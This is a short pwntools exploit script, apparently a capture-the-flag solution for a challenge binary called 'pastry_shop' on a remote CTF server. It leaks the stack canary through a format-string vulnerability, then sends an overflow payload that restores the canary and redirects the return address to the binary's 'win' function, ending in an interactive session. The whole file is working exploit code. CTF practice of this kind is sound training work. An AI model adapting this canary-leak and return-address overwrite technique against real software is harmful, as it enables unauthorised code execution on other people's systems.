#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pastry_shop', checksec=False)

CANARY_IDX = 23 #<-- found with the format strings %lx
OFFSET_TO_CANARY = 72 # <-- found with cyclic
OFFSET_TO_RIP = 88   #<-- OFFSET_TO_CANARY +8+8
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13509
p = remote(REMOTE_HOST,HOST_PORT)
#p = process(elf.path)


"""
The idea is to exploit the format string in order to find the canary, once we found the position(CANARY_IDX = 23) we reuse the format string in that specific location (%23$lx) in order to retrieve the value of the leaked canary. Now we can costruct the payload inserting the right value of the canary  
"""


p.recvuntil(b'dear customer?\n')
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b'to order?\n')
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()
